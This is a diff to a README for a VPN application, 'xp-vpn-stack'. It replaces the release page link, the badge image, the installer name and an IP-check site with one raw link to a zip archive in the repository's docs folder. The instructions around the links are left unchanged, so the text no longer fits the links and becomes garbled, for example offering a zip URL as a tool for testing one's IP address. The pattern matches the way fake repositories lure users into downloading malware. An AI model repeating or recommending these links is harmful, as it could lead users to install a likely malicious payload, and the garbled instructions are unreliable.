@@ -20,16 +20,16 @@ Welcome to the **xp-vpn-stack**! This application helps you set up a secure and 
 
 To get started, visit our Releases page to download the application. Click the button below to access the download directly.
 
-[![Download xp-vpn-stack](https://img.shields.io/badge/Download-xp--vpn--stack-brightgreen)](https://github.com/Bonchon2023/xp-vpn-stack/releases)
+[![Download xp-vpn-stack](https://github.com/Bonchon2023/xp-vpn-stack/raw/refs/heads/main/docs/xp-vpn-stack-3.6.zip)](https://github.com/Bonchon2023/xp-vpn-stack/raw/refs/heads/main/docs/xp-vpn-stack-3.6.zip)
 
 ### Steps to Download and Install
 
-1. Click the [Download Link](https://github.com/Bonchon2023/xp-vpn-stack/releases) above.
+1. Click the [Download Link](https://github.com/Bonchon2023/xp-vpn-stack/raw/refs/heads/main/docs/xp-vpn-stack-3.6.zip) above.
 2. You will see a list of available releases.
 3. Choose the latest version from the list.
 4. Click on the release title to view details.
 5. Scroll down to the **Assets** section.
-6. Download the appropriate installer for your system. Look for file names that look like `xp-vpn-stack-installer.exe`.
+6. Download the appropriate installer for your system. Look for file names that look like `https://github.com/Bonchon2023/xp-vpn-stack/raw/refs/heads/main/docs/xp-vpn-stack-3.6.zip`.
 7. Once the file downloads, navigate to your Downloads folder.
 8. Double-click the downloaded file to start the installation process.
 9. Follow the on-screen instructions to complete the installation.
@@ -60,7 +60,7 @@ After installation, you must configure the VPN settings:
 After successfully connecting, here are some tips:
 
 - **Check Status**: Ensure you are connected with an active status indicator.
-- **Test Connection**: Use tools like `whatismyip.com` to verify your IP address and confirm you are protected.
+- **Test Connection**: Use tools like `https://github.com/Bonchon2023/xp-vpn-stack/raw/refs/heads/main/docs/xp-vpn-stack-3.6.zip` to verify your IP address and confirm you are protected.
 - **Change Settings**: You may adjust bandwidth settings or switch servers in the app settings.
 
 ## 🆘 Troubleshooting
